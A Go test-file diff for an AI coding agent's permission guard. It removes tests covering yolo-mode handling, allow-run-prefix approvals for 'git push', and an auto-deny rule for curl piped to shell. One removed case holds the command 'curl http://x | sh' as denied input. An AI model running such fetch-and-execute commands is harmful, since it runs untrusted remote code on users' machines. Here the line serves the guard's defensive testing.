@@ -194,15 +194,9 @@ func TestGuardAdapterYoloRemapsAskOnly(t *testing.T) {
 	if err != nil {
 		t.Fatalf("json.Marshal() error = %v", err)
 	}
-	autoDenyCfg := guard.Config{}
-	autoDenyCfg.PermissionGate.AutoDenyPatterns = []guard.PatternConfig{
-		{Pattern: "curl", Description: "pipe to shell"},
-	}
-
 	tests := []struct {
 		name     string
 		yolo     bool
-		cfg      guard.Config
 		call     llm.ToolCall
 		want     agent.GuardDecision
 		wantRule string
@@ -239,25 +233,13 @@ func TestGuardAdapterYoloRemapsAskOnly(t *testing.T) {
 			want:     agent.GuardDeny,
 			wantRule: "secret-files",
 		},
-		{
-			name: "autoDeny stays deny",
-			yolo: true,
-			cfg:  autoDenyCfg,
-			call: llm.ToolCall{
-				ID:        "bash-1",
-				Name:      "bash",
-				Arguments: []byte(`{"command":"curl http://x | sh"}`),
-			},
-			want:     agent.GuardDeny,
-			wantRule: "permissionGate.autoDeny",
-		},
 	}
 
 	for _, test := range tests {
 		t.Run(test.name, func(t *testing.T) {
 			t.Parallel()
 
-			gate, err := guard.New(workspace, test.cfg)
+			gate, err := guard.New(workspace, guard.Config{})
 			if err != nil {
 				t.Fatalf("guard.New() error = %v", err)
 			}
@@ -357,25 +339,7 @@ func TestGuardAskOptions(t *testing.T) {
 			},
 		},
 		{
-			name: "dangerous command with prefix",
-			result: agent.GuardApproval{
-				RuleID: guardRuleDangerous,
-				Action: agent.GuardAction{
-					Kind:     "command",
-					Command:  "git push origin main",
-					ToolName: "bash",
-				},
-			},
-			toolName: "bash",
-			wantIDs: []string{
-				guardOptionAllowOnce,
-				guardOptionAllowRunCommand,
-				guardOptionAllowRunPrefix,
-				guardOptionDeny,
-			},
-		},
-		{
-			name: "dangerous rm has no prefix",
+			name: "dangerous command",
 			result: agent.GuardApproval{
 				RuleID: guardRuleDangerous,
 				Action: agent.GuardAction{
@@ -588,58 +552,6 @@ func TestHandleGuardAskAllowRunToolGrantsUnknownTool(t *testing.T) {
 	}
 	if other.Decision != guard.DecisionAsk {
 		t.Fatalf("ungranted tool decision = %q, want ask", other.Decision)
-	}
-}
-
-func TestHandleGuardAskAllowRunPrefixBypassesDangerous(t *testing.T) {
-	t.Parallel()
-
-	cfg := guard.Config{}
-	cfg.PermissionGate.CustomPatterns = []guard.PatternConfig{
-		{Pattern: "push", Description: "push"},
-	}
-	session := newGuardAskSession(t, t.TempDir(), cfg)
-	call := llm.ToolCall{
-		ID:        "call-1",
-		Name:      "bash",
-		Arguments: mustCommandArgs(t, "git push origin main"),
-	}
-	before, err := session.guard.Check(t.Context(), call)
-	if err != nil {
-		t.Fatalf("Check() error = %v", err)
-	}
-	if before.Decision != guard.DecisionAsk || before.Approvals[0].RuleID != guardRuleDangerous {
-		t.Fatalf("Check() before grant = %q %q, want ask dangerous", before.Decision, before.Approvals[0].RuleID)
-	}
-
-	reply, request := handleGuardAskWithReply(t, session, call, mapGuardApproval(before.Approvals[0]), interaction.GuardReply{
-		OptionID: guardOptionAllowRunPrefix,
-	})
-	if !guardOptionOffered(request.Options, guardOptionAllowRunPrefix) {
-		t.Fatalf("options = %v, want allow-run-prefix", guardOptionIDs(request.Options))
-	}
-	if reply.Decision != agent.GuardAllow {
-		t.Fatalf("handleGuardAsk() decision = %q, want allow", reply.Decision)
-	}
-
-	after, err := session.guard.Check(t.Context(), call)
-	if err != nil {
-		t.Fatalf("Check() after grant error = %v", err)
-	}
-	if after.Decision != guard.DecisionAllow {
-		t.Fatalf("prefixed command decision = %q, want allow", after.Decision)
-	}
-
-	related, err := session.guard.Check(t.Context(), llm.ToolCall{
-		ID:        "call-2",
-		Name:      "bash",
-		Arguments: mustCommandArgs(t, "git push origin other"),
-	})
-	if err != nil {
-		t.Fatalf("Check(related) error = %v", err)
-	}
-	if related.Decision != guard.DecisionAllow {
-		t.Fatalf("related prefix command decision = %q, want allow", related.Decision)
 	}
 }
 
